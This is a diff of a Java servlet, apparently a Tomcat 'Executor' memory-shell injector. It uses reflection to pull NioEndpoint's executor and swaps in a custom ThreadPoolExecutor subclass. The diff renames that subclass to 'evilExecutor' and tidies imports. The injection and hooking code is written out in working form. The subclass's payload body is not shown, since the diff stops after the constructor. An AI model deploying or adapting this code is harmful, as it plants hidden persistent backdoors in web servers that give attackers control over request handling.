@@ -10,7 +10,6 @@ import java.io.IOException;
 import org.apache.tomcat.util.net.NioEndpoint;
 import org.apache.tomcat.util.threads.ThreadPoolExecutor;
 
-import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.concurrent.ThreadFactory;
 import java.util.concurrent.TimeUnit;
@@ -19,7 +18,6 @@ import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import org.apache.coyote.RequestInfo;
 import org.apache.coyote.Response;
-import java.io.IOException;
 import org.apache.tomcat.util.net.SocketWrapperBase;
 import java.nio.charset.StandardCharsets;
 import java.net.URLEncoder;
@@ -32,18 +30,19 @@ public class InjectExecutor extends HttpServlet {
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
         NioEndpoint endpoint = (NioEndpoint) getStandardService();
         ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(endpoint, "executor");
-        ThreadPoolExecutor exe = new threadexcutor(
+        ThreadPoolExecutor exe = new evilExecutor(
                 exec.getCorePoolSize(), exec.getMaximumPoolSize(),
                 exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS,
                 exec.getQueue(), exec.getThreadFactory(),
                 exec.getRejectedExecutionHandler());
         endpoint.setExecutor(exe);
 
+
     }
 
-    class threadexcutor extends ThreadPoolExecutor {
+    class evilExecutor extends ThreadPoolExecutor {
 
-        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
+        public evilExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
             super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
         }
 
